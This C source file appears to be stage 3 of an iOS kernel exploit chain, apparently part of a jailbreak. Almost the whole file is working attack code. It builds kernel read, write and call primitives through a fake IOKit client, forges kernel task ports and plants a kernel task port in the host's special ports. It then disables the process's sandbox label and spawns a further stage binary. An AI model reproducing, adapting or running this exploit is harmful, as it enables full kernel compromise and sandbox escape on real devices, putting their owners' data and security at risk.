#include <stdint.h>
#include <stdarg.h>
#include <stddef.h>
#include <stdbool.h>

// a hell lot of type defs are ahead of you because we can't use any functions here
// this is basically the version of the exploit used in the app (minus the race part obv) just copy pasted into here and then I changed a few things so that it doesn't rely on cache functions
// so for a more readable version/to understand it please check the version under shared (pwn.m)

typedef uint64_t kptr_t;
typedef int kern_return_t;
typedef uint32_t mach_port_t;
typedef mach_port_t * mach_port_array_t;
typedef int vm_prot_t;
typedef uint64_t mach_vm_address_t;
typedef unsigned int mach_msg_type_number_t;
typedef uint32_t io_connect_t;
typedef uint32_t mach_port_name_t;
typedef void * task_t;
typedef mach_port_t vm_map_t;
typedef uint64_t mach_vm_size_t;
typedef uint64_t mach_msg_timeout_t;
typedef uint64_t mach_msg_size_t;
typedef uint32_t mach_msg_option_t;
typedef uint64_t mach_msg_return_t;
typedef uint64_t mach_vm_offset_t;
typedef uint32_t mach_port_right_t;
typedef bool boolean_t;
typedef void * ipc_space_t;
typedef unsigned int vm_inherit_t;
typedef uint64_t mach_port_poly_t; // ???
typedef uint32_t mach_msg_type_name_t; 
typedef struct
{
	unsigned int msgh_bits;
	unsigned int msgh_size;
	unsigned int msgh_remote_port;
	unsigned int msgh_local_port;
	unsigned int msgh_reserved;
	int msgh_id;
} mach_msg_header_t;
typedef struct {
    struct {
        kptr_t kernel_image_base;
    } constant;

    struct {
        kptr_t copyin;
        kptr_t copyout;
        kptr_t current_task;
        kptr_t get_bsdtask_info;
        kptr_t vm_map_wire_external;
        kptr_t vfs_context_current;
        kptr_t vnode_lookup;
        kptr_t osunserializexml;
        kptr_t smalloc;

        kptr_t ipc_port_alloc_special;
        kptr_t ipc_kobject_set;
        kptr_t ipc_port_make_send;
    } funcs;

    struct {
        kptr_t add_x0_x0_ret;
    } gadgets;

    struct {
        kptr_t realhost;
        kptr_t zone_map;
        kptr_t kernel_task;
        kptr_t kern_proc;
        kptr_t rootvnode;
        kptr_t osboolean_true;
        kptr_t trust_cache;
    } data;

    struct {
        kptr_t iosurface_root_userclient;
    } vtabs;

    struct {
        uint32_t is_task_offset;
        uint32_t task_itk_self;
        uint32_t itk_registered;
        uint32_t ipr_size;
        uint32_t sizeof_task;
        uint32_t task_all_image_info_addr;
        uint32_t task_all_image_info_size;
    } struct_offsets;

    struct {
        uint32_t create_outsize;
        uint32_t create_surface;
        uint32_t set_value;
    } iosurface;

	struct {
		void (*write) (int fd,void * buf,uint64_t size);
		kern_return_t (*IOConnectTrap6) (io_connect_t connect,uint32_t selector, uint64_t arg1,uint64_t arg2,uint64_t arg3,uint64_t arg4,uint64_t arg5,uint64_t arg6);
		kern_return_t (*mach_ports_lookup) (task_t target_task,mach_port_array_t init_port_set,mach_msg_type_number_t * init_port_count);
		mach_port_name_t (*mach_task_self) ();
		kern_return_t (*mach_vm_remap) (vm_map_t target_task, mach_vm_address_t *target_address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src_task, mach_vm_address_t src_address, boolean_t copy, vm_prot_t *cur_protection, vm_prot_t *max_protection, vm_inherit_t inheritance);
		kern_return_t (*mach_port_destroy) (ipc_space_t task,mach_port_name_t name);
		kern_return_t (*mach_port_deallocate) (ipc_space_t task,mach_port_name_t name);
		kern_return_t (*mach_port_allocate) (ipc_space_t task,mach_port_right_t right,mach_port_name_t *name);
		kern_return_t (*mach_port_insert_right) (ipc_space_t task,mach_port_name_t name,mach_port_poly_t right,mach_msg_type_name_t right_type);
		kern_return_t (*mach_ports_register) (task_t target_task,mach_port_array_t init_port_set,uint64_t /*???target_task*/ init_port_array_count);
		mach_msg_return_t (*mach_msg) (mach_msg_header_t * msg,mach_msg_option_t option,mach_msg_size_t send_size,mach_msg_size_t receive_limit,mach_port_t receive_name,mach_msg_timeout_t timeout,mach_port_t notify);
		int (*posix_spawn) (uint64_t pid, const char * path, void *, void *, char * const argv[], char * const envp[]);
	} userland_funcs;
} offsets_t;

typedef volatile struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        kptr_t data;
        uint32_t type;
#ifdef __LP64__
        uint32_t pad; 
#endif
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    kptr_t next;
                    kptr_t prev;
                } waitq_queue;
            } waitq;
            kptr_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
#ifdef __LP64__
            uint32_t pad;
#endif
        } port;
        kptr_t klist;
    } ip_messages;
    kptr_t ip_receiver;
    kptr_t ip_kobject;
    kptr_t ip_nsrequest;
    kptr_t ip_pdrequest;
    kptr_t ip_requests;
    kptr_t ip_premsg;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
} kport_t;
typedef volatile union
{
    struct {
        struct {
            kptr_t data;
            uint32_t reserved : 24,
            type     :  8;
            uint32_t pad;
        } lock; // mutex lock
        uint32_t ref_count;
        uint32_t active;
        uint32_t halting;
        uint32_t pad;
        kptr_t map;
    } a;
} ktask_t;
typedef struct
{
    mach_msg_header_t head;
    uint64_t verification_key;
    char data[0];
    char padding[4];
} mach_msg_data_buffer_t;

//#define LOG(str, args...) do { } while(0)
#define LOG(str, args...) do {offsets->userland_funcs.write(2,str,1024);offsets->userland_funcs.write(1,"\n\n\n\n",4);} while(0)
#define KERN_INVALID_ARGUMENT 2
#define KERN_FAILURE 1
#define KERN_SUCCESS 0


#define IO_BITS_ACTIVE 0x80000000
#define IOT_PORT 0
#define IKOT_NONE 0
#define IKOT_TASK 2
#define IKOT_IOKIT_CONNECT 29

#define pgsize 0x4000


#define VM_PROT_READ 0x1
#define VM_PROT_WRITE 0x2
#define VM_PROT_EXECUTE 0x3
#define VM_FLAGS_ANYWHERE 0x0001
#define VM_FLAGS_RETURN_DATA_ADDR 0x100000
#define VM_INHERIT_NONE 2

#define MACH_PORT_NULL 0
#define MACH_PORT_DEAD ((uint32_t) ~0)
#define MACH_PORT_VALID(x) (((x) != MACH_PORT_NULL) && ((x) != MACH_PORT_DEAD))
#define MACH_MSG_TYPE_MAKE_SEND 20
#define MACH_PORT_RIGHT_RECEIVE 1
#define MACH_SEND_MSG 1
#define MACH_MSGH_BITS(remote, local) ((remote) | ((local) << 8))


// function that's used to place data of a userland buffer in kernel land
uint64_t send_buffer_to_kernel_stage3_implementation(offsets_t * offsets,void * fake_client,uint64_t kslide, mach_port_t the_one, uint64_t our_task_addr, mach_msg_data_buffer_t *buffer_msg, size_t msg_size);

#define spelunk(addr) ((zm_hdr.start & 0xffffffff00000000) | ((addr) & 0xffffffff))
#define zonemap_fix_addr(addr) (spelunk(addr) < zm_hdr.start ? spelunk(addr) + 0x100000000 : spelunk(addr))

uint64_t kcall_raw(offsets_t * offsets,void * fake_client, uint64_t kslide,mach_port_name_t the_one,uint64_t addr, int n_args, ...)
{
    if (n_args > 7)
    {
        LOG("no more than 7 args you cheeky fuck");
        return KERN_INVALID_ARGUMENT;
    }

    va_list ap;
    va_start(ap, n_args);

    uint64_t args[7];
	for (int i = 0; i < 7; i++) {args[i] = 0;}
    for (int i = 0; i < n_args; i++)
    {
        args[i] = va_arg(ap, uint64_t);
    }

    // first arg must always have a value
    if (n_args == 0 ||
        args[0] == 0x0)
    {
        args[0] = 0x1;
    }

    *(uint64_t *)(fake_client + 0x40) = args[0];
    *(uint64_t *)(fake_client + 0x48) = addr + kslide;

    return offsets->userland_funcs.IOConnectTrap6(the_one, 0, args[1], args[2], args[3], args[4], args[5], args[6]);
}
#define kcall(addr,n_args, ...) kcall_raw(offsets,fake_client,kslide,the_one,addr,n_args,##__VA_ARGS__)

void kreadbuf_raw(offsets_t * offsets,void * fake_client, uint64_t kslide,mach_port_name_t the_one,uint64_t addr, void *buf, size_t len)
{
    kcall(offsets->funcs.copyout, 3, addr, buf, len);
}

#define kreadbuf(addr,buf,len) kreadbuf_raw(offsets,fake_client,kslide,the_one,addr,buf,len)


uint32_t kread32_raw(offsets_t * offsets,void * fake_client, uint64_t kslide,mach_port_name_t the_one,uint64_t addr)
{
    uint32_t val = 0;
    kreadbuf(addr, &val, sizeof(val));
    return val;
}
#define kread32(addr) kread32_raw(offsets,fake_client,kslide,the_one,addr)

uint64_t kread64_raw(offsets_t * offsets, void * fake_client, uint64_t kslide,mach_port_name_t the_one,uint64_t addr)
{
    uint64_t val = 0;
    kreadbuf(addr, &val, sizeof(val));
    return val;
}
#define kread64(addr) kread64_raw(offsets,fake_client,kslide,the_one,addr)


void kwritebuf_raw(offsets_t * offsets,void * fake_client, uint64_t kslide,mach_port_name_t the_one,uint64_t addr, void *buf, size_t len)
{
    kcall(offsets->funcs.copyin, 3, buf, addr, len);
}
#define kwritebuf(addr,buf,len) kwritebuf_raw(offsets,fake_client,kslide,the_one,addr,buf,len)


void kwrite32_raw(offsets_t * offsets, void * fake_client, uint64_t kslide,mach_port_name_t the_one, uint64_t addr, uint32_t val)
{
    kwritebuf(addr, &val, sizeof(val));
}
#define kwrite32(addr,val) kwrite32_raw(offsets,fake_client,kslide,the_one,addr,val)


void kwrite64_raw(offsets_t * offsets, void * fake_client, uint64_t kslide,mach_port_name_t the_one,uint64_t addr, uint64_t val)
{
    kwritebuf(addr, &val, sizeof(val));
}
#define kwrite64(addr,val) kwrite64_raw(offsets,fake_client,kslide,the_one,addr,val)

void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobject_client_port_addr,uint64_t our_task_addr,uint64_t kslide,uint64_t the_one,offsets_t * offsets) {
    mach_port_array_t maps = NULL;
    mach_msg_type_number_t maps_num = 0;
	kern_return_t ret;
    uint64_t zone_map_addr = kread64(offsets->data.zone_map + kslide);

    if (zone_map_addr == 0x0)
    {
        LOG("failed to get zone map addr");
        ret = KERN_FAILURE;
        goto out;
    }

    LOG("[+] got zone map addr: %llx", zone_map_addr);

    typedef volatile struct
    {
        kptr_t prev;
        kptr_t next;
        kptr_t start;
        kptr_t end;
    } kmap_hdr_t;

    kmap_hdr_t zm_hdr;
	for (int i = 0; i < sizeof(zm_hdr);i++) {
		*((char*)(((uint64_t)&zm_hdr) + i)) = 0x0;
	}

    // lck_rw_t = uintptr_t opaque[2] = unsigned long opaque[2]
    kreadbuf(zone_map_addr + (sizeof(unsigned long) * 2), (void *)&zm_hdr, sizeof(zm_hdr));

    LOG("zmap start: %llx", zm_hdr.start);
    LOG("zmap end: %llx", zm_hdr.end);

    uint64_t zm_size = zm_hdr.end - zm_hdr.start;
    LOG("zmap size: %llx", zm_size);

    if (zm_size > 0x100000000)
    {
        LOG("zonemap too large :/");
        ret = KERN_FAILURE;
        goto out;
    }
	uint64_t kern_task_addr = kread64(offsets->data.kernel_task + kslide);
    if (kern_task_addr == 0x0)
    {
        LOG("failed to read kern_task_addr!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("[+] kern_task_addr: %llx", kern_task_addr);

    uint64_t kern_proc = zonemap_fix_addr(kcall(offsets->funcs.get_bsdtask_info, 1, kern_task_addr));
    if (kern_proc == 0x0)
    {
        LOG("failed to read kern_proc!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("[+] got kernproc: %llx", kern_proc);;

    uint64_t curr_task = zonemap_fix_addr(kcall(offsets->funcs.current_task, 0));
    if (curr_task == 0x0)
    {
        LOG("failed to get curr_task!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("[+] curr task: %llx", curr_task);

    // get kernel map
    uint64_t kernel_vm_map = kread64(kern_task_addr + 0x20);
    if (kernel_vm_map == 0x0)
    {
        LOG("failed to read kernel_vm_map!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("got kernel vm map: %llx", kernel_vm_map);

    uint64_t ipc_space_kernel = kread64(ip_kobject_client_port_addr + offsetof(kport_t, ip_receiver));;
    if (ipc_space_kernel == 0x0)
    {
        LOG("failed to read ipc_space_kernel!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("ipc_space_kernel: %llx", ipc_space_kernel);

    uint64_t ptrs[2];
	ptrs[0] = 0;
	ptrs[1] = 0;
    ptrs[0] = zonemap_fix_addr(kcall(offsets->funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
    ptrs[1] = zonemap_fix_addr(kcall(offsets->funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
    LOG("zm_port addr: %llx", ptrs[0]);
    LOG("km_port addr: %llx", ptrs[1]);

    size_t ktask_size = offsets->struct_offsets.sizeof_task;

	volatile char scratch_space[4096];
	if (ktask_size > 2048) {
		LOG("Buffer to small");
		ret = KERN_FAILURE;
		goto out;
	}
    mach_msg_data_buffer_t * zm_task_buf_msg = (mach_msg_data_buffer_t *)&scratch_space[0];
    for (int i = 0; i < 4096; i++) {
		scratch_space[i] = 0x0;
	}

    zm_task_buf_msg->verification_key = 0x4242424243434343;

    ktask_t *zm_task_buf = (ktask_t *)(&zm_task_buf_msg->data[0]);

    zm_task_buf->a.lock.data = 0x0;
    zm_task_buf->a.lock.type = 0x22;
    zm_task_buf->a.ref_count = 100;
    zm_task_buf->a.active = 1;
    *(kptr_t *)((uint64_t)zm_task_buf + offsets->struct_offsets.task_itk_self) = 1;
    zm_task_buf->a.map = zone_map_addr;

	mach_msg_data_buffer_t * km_task_buf_msg = (mach_msg_data_buffer_t *)(((uint64_t)&scratch_space[0]) + 2048);
	// duplicate the message
	for (int i = 0; i < ktask_size; i++) {
		scratch_space[i+2048] = scratch_space[i];
	}

	km_task_buf_msg->verification_key = 0x4343434344444444;
	ktask_t *km_task_buf = (ktask_t *)(&km_task_buf_msg->data[0]);
    km_task_buf->a.map = kernel_vm_map;

    // send both messages into kernel and grab the buffer addresses
    uint64_t zm_task_buf_addr = send_buffer_to_kernel_stage3_implementation(offsets, fake_client,kslide,the_one, our_task_addr, zm_task_buf_msg, ktask_size);
    if (zm_task_buf_addr == 0x0)
    {
        LOG("failed to get zm_task_buf_addr!");
        goto out;
    }

    LOG("zm_task_buf_addr: %llx", zm_task_buf_addr);

    uint64_t km_task_buf_addr = send_buffer_to_kernel_stage3_implementation(offsets, fake_client,kslide,the_one, our_task_addr, km_task_buf_msg, ktask_size);
    if (km_task_buf_addr == 0x0)
    {
        LOG("failed to get km_task_buf_addr!");
        goto out;
    }

    LOG("km_task_buf_addr: %llx", km_task_buf_addr);

    kcall(offsets->funcs.ipc_kobject_set, 3, ptrs[0], (uint64_t)zm_task_buf, IKOT_TASK);
    kcall(offsets->funcs.ipc_kobject_set, 3, ptrs[1], (uint64_t)km_task_buf, IKOT_TASK);

    kwrite64(curr_task + offsets->struct_offsets.itk_registered + 0x0, ptrs[0]);
    kwrite64(curr_task + offsets->struct_offsets.itk_registered + 0x8, ptrs[1]);


    ret = offsets->userland_funcs.mach_ports_lookup(offsets->userland_funcs.mach_task_self(), &maps, &maps_num);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to lookup mach ports: %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }

    LOG("zone_map port: %x", maps[0]);
    LOG("kernel_map port: %x", maps[1]);

    if (!MACH_PORT_VALID(maps[0]) ||
        !MACH_PORT_VALID(maps[1]))
    {
        LOG("invalid zone/kernel map ports");
        ret = KERN_FAILURE;
        goto out;
    }

    ptrs[0] = ptrs[1] = 0x0;

    kwrite64(curr_task + offsets->struct_offsets.itk_registered + 0x0, 0x0);
    kwrite64(curr_task + offsets->struct_offsets.itk_registered + 0x8, 0x0);

    LOG("kern_task_addr: %llx", kern_task_addr);

	// setup kernel base and slide for post
	kwrite64(kern_task_addr + offsets->struct_offsets.task_all_image_info_addr,offsets->constant.kernel_image_base + kslide);
	kwrite64(kern_task_addr + offsets->struct_offsets.task_all_image_info_size,kslide);

	mach_vm_address_t remap_addr = 0x0;
    vm_prot_t cur = 0x0, max = 0x0;
    ret = offsets->userland_funcs.mach_vm_remap(maps[1], &remap_addr, offsets->struct_offsets.sizeof_task, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, maps[0], kern_task_addr, false, &cur, &max, VM_INHERIT_NONE);
    if (ret != KERN_SUCCESS)
    {
        LOG("mach_vm_remap failed: %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }

    LOG("[+] remap addr: %llx", remap_addr);


    offsets->userland_funcs.mach_port_destroy(offsets->userland_funcs.mach_task_self(), maps[0]);
    offsets->userland_funcs.mach_port_destroy(offsets->userland_funcs.mach_task_self(), maps[1]);

    // remap must cover the entire struct and be page aligned 
    uint64_t remap_start = remap_addr & ~(pgsize - 1);
    uint64_t remap_end = (remap_addr + offsets->struct_offsets.sizeof_task + pgsize) & ~(pgsize - 1);

    // kern_return_t vm_map_wire_external(vm_map_t map, vm_map_offset_t start, vm_map_offset_t end, vm_prot_t caller_prot, boolean_t user_wire)
    ret = kcall(offsets->funcs.vm_map_wire_external, 5, kernel_vm_map, remap_start, remap_end, VM_PROT_READ | VM_PROT_WRITE, false);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to kcall vm_map_wire_external: %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }

    uint64_t new_port = zonemap_fix_addr(kcall(offsets->funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
    LOG("new_port: %llx", new_port);


    kcall(offsets->funcs.ipc_kobject_set, 3, new_port, remap_addr, IKOT_TASK);
    kcall(offsets->funcs.ipc_port_make_send, 1, new_port);

    uint64_t realhost = offsets->data.realhost + kslide;
    LOG("[!] realhost: %llx", realhost);

// realhost->special[4]
    kwrite64(realhost + 0x10 + (sizeof(uint64_t) * 4), new_port);
    LOG("registered realhost->special[4]");

    // zero out old ports before overwriting
    for (int i = 0; i < 3; i++)
    {
        kwrite64(curr_task + offsets->struct_offsets.itk_registered + (i * 0x8), 0x0);
    }

    kwrite64(curr_task + offsets->struct_offsets.itk_registered, new_port);
    LOG("wrote new port: %llx", new_port);

    ret = offsets->userland_funcs.mach_ports_lookup(offsets->userland_funcs.mach_task_self(), &maps, &maps_num);

//    kwrite64(curr_task + ITK_REGISTERED_OFFSET, 0x0);

    if (ret != KERN_SUCCESS)
    {
        LOG("failed to lookup mach ports: %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }

    mach_port_t kernel_task = maps[0];
    if (!MACH_PORT_VALID(kernel_task))
    {
        LOG("kernel_task is invalid");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("got kernel task port: %x", kernel_task);

	// we have the task address in our_task_addr
	// now we need to read back bsd_info and then go from there to ucread and zero cr_label->p_perpolicy[1]
	uint64_t our_proc = zonemap_fix_addr(kcall(offsets->funcs.get_bsdtask_info, 1, our_task_addr));
	uint64_t our_ucred = kread64(our_proc + 0x100);
	uint64_t our_label = kread64(our_ucred + 0x78);
	kwrite64(our_label + 0x10,0x0);

	// spawn the other bin
	uint64_t pid;
	offsets->userland_funcs.posix_spawn(&pid,"/mystuff/stage4",NULL,NULL,NULL,NULL);

	LOG("finally spawned stage 4 what a ride");

out:
	fakeport->ip_bits = 0x0;
    fakeport->ip_kobject = 0x0;
	offsets->userland_funcs.mach_port_deallocate(offsets->userland_funcs.mach_task_self(), the_one);

	// spin for now
	while (1) {}

	// exit call
	__asm__(
			"movz x0, 0x0\n"
			"movz x16, 0x1\n"
			"svc 0x80"
			);
}

// kinda messy function signature
uint64_t send_buffer_to_kernel_stage3_implementation(offsets_t * offsets,void * fake_client,uint64_t kslide, mach_port_t the_one, uint64_t our_task_addr, mach_msg_data_buffer_t *buffer_msg, size_t msg_size)
{
    kern_return_t ret;

    buffer_msg->head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    buffer_msg->head.msgh_local_port = MACH_PORT_NULL;
    buffer_msg->head.msgh_size = msg_size;

    mach_port_t port;
    ret = offsets->userland_funcs.mach_port_allocate(offsets->userland_funcs.mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to allocate mach port: %x", ret);
        goto err;
    }

    LOG("got port: %x", port);

    ret = offsets->userland_funcs.mach_port_insert_right(offsets->userland_funcs.mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed ot insert send right: %x", ret);
        goto err;
    }

    ret = offsets->userland_funcs.mach_ports_register(offsets->userland_funcs.mach_task_self(), &port, 1);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to register mach port: %x", ret);
        goto err;
    }

    buffer_msg->head.msgh_remote_port = port;

    ret = offsets->userland_funcs.mach_msg(&buffer_msg->head, MACH_SEND_MSG, buffer_msg->head.msgh_size, 0, 0, 0, 0);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to send mach message: %x (%s)", ret, mach_error_string(ret));
        goto err;
    }

    uint64_t itk_registered = kread64(our_task_addr + offsets->struct_offsets.itk_registered);
    if (itk_registered == 0x0)
    {
        LOG("failed to read our_task_addr->itk_registered!");
        goto err;
    }

    LOG("itk_registered: %llx", itk_registered);

    uint16_t msg_count = kread64(itk_registered + offsetof(kport_t, ip_messages.port.msgcount)) & 0xffff;
    if (msg_count != 1)
    {
        LOG("got weird msgcount! expected 1 but got: %x", msg_count);
        goto err;
    }

    LOG("msg_count: %d", msg_count);
    uint64_t messages = kread64(itk_registered + offsetof(kport_t, ip_messages.port.messages));
    if (messages == 0x0)
    {
        LOG("unable to find ip_messages.port.messages in kernel port!");
        goto err;
    }

    LOG("messages: %llx", messages);

    uint64_t header = kread64(messages + 0x18); // ipc_kmsg->ikm_header
    if (header == 0x0)
    {
        LOG("unable to find ipc_kmsg->ikm_header");
        goto err;
    }

    LOG("header: %llx", header);

    uint64_t key_address = header + 0x20; // ikm_header->verification_key (in the msg body)

    LOG("key_address: %llx", key_address);

    uint64_t kernel_key = kread64(key_address);
    if (kernel_key != buffer_msg->verification_key)
    {
        LOG("kernel verification key did not match! found wrong kmsg? expected: %llx, got: %llx", buffer_msg->verification_key, kernel_key);
        goto err;
    }

    ret = offsets->userland_funcs.mach_ports_register(offsets->userland_funcs.mach_task_self(), NULL, 0);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to call mach_ports_register: %x", ret);
        goto err;
    }

    return key_address + sizeof(kernel_key);

err:
    return 0x0;
}
